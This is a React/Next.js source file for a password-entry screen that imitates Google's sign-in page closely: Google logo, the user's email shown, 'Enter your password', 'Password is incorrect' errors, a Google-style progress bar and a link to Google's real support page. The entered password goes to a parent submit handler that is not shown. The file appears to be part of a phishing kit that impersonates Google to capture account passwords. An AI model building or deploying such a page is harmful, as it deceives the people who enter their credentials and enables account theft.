import Image from "next/image";
import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";

export default function Password({
  email,
  password,
  setPassword,
  handleSubmit,
  isPasswordError,
  setIsPasswordError
}) {
  const [isFocused, setIsFocused] = useState(false);
  const [isShow, setIsShow] = useState(false);
  const [isAnimating, setIsAnimating] = useState(false);
  const [localIsPasswordError, setLocalIsPasswordError] = useState(false);
  const [clickCount, setClickCount] = useState(0);

  // Sync local error state with parent when isPasswordError changes
  useEffect(() => {
    setLocalIsPasswordError(isPasswordError);
  }, [isPasswordError]);

  // Stop animation if localIsPasswordError becomes true
  useEffect(() => {
    if (localIsPasswordError && isAnimating) {
      setIsAnimating(false);
    }
  }, [localIsPasswordError, isAnimating]);

  const handleSubmitWithAnimation = (e) => {
    // Increment click count to force a fresh animation start
    setClickCount(prev => prev + 1);
    // Reset local error state and start animation immediately
    setLocalIsPasswordError(false);
    setIsAnimating(true);
    handleSubmit(e);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-white">
      <div className="bg-white p-10 rounded-lg border border-gray-400 w-96 relative overflow-hidden">
        {/* Bottom layer: Main content */}
        <div className="relative z-0">
          <div className="flex justify-center mb-4">
            <Image
              src="/googlelongicon.png" // Path to your Google logo image
              alt="Google Logo"
              width={100} // Specify the width of the image
              height={50} // Specify the height of the image
              className="h-full"
            />
          </div>
          <div className="text-2xl text-black font-normal text-center mb-4">
            Welcome
          </div>
          <div className="flex w-full justify-center items-center mb-10">
            <div className="text-sm text-black border-[1px] border-gray-400 rounded-full px-2 py-1 flex items-center">
              <Image
                src="/PersonIcon.png" // Path to your person icon image
                alt="Person Icon"
                width={25} // Specify the width of the image
                height={25} // Specify the height of the image
                className="mr-2" // Adds margin to the right for spacing
              />
              <span className="mr-1">{email}</span>
            </div>
          </div>
          <div>
            <div className="w-full relative">
              {isFocused && (
                <div
                  className={`absolute text-black text-sm bg-white top-[-20%] left-3 text-center flex justify-center items-center px-1 ${
                    isPasswordError ? "text-red-500" : "text-blue-600"
                  }`}
                >
                  Enter your password
                </div>
              )}
              <input
                type={isShow ? "text" : "password"}
                value={password}
                onClick={() => setIsFocused(true)}
                onChange={(e) => {
                  setPassword(e.target.value);
                  setIsPasswordError(false);
                }}
                placeholder="Enter your password"
                className={`w-full mb-2 text-black p-3 border border-gray-400 rounded  placeholder:text-gray-500  ${
                  isFocused
                    ? isPasswordError
                      ? "ring-red-500 ring-2 outline-none border-none placeholder:text-white"
                      : "ring-blue-600 ring-2 outline-none border-none placeholder:text-white"
                    : "ring-0"
                }`}
                required
              />
            </div>
            <div className="mb-5 font-semibold">
              {isPasswordError && (
                <p className="text-red-500 text-xs mt-1">Password is incorrect</p>
              )}
            </div>
            <label className="flex items-center text-sm text-black mb-10">
              <input
                type="checkbox"
                checked={isShow}
                onChange={() => setIsShow(!isShow)}
                className="mr-2 h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
              />
              Show password
            </label>
            <div className="flex justify-between items-center font-sans font-semibold">
              <a
                target="blank"
                href="https://support.google.com/mail/answer/56256?hl=en"
                className="text-blue-600 text-sm hover:underline"
              >
                Forget password?
              </a>
              <button
                onClick={handleSubmitWithAnimation}
                className="bg-blue-600 text-white px-6 py-2 rounded-md hover:bg-blue-700"
              >
                Next
              </button>
            </div>
          </div>
        </div>

        {/* Middle layer: Semi-transparent white box */}
        <AnimatePresence key={`password-middle-${clickCount}`}>
          {isAnimating && (
            <div className="absolute inset-0 bg-white opacity-60 rounded-lg z-10"></div>
          )}
        </AnimatePresence>

        {/* Top layer: Blue animation bar */}
        <AnimatePresence key={`password-top-${clickCount}`}>
          {isAnimating && (
            <motion.div
              className="absolute top-0 left-0 w-full h-1 bg-blue-600 z-20"
              initial={{ x: "100%" }}
              animate={{ x: "-100%" }}
              transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
              exit={{ x: "100%", transition: { duration: 0.3 } }}
            />
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}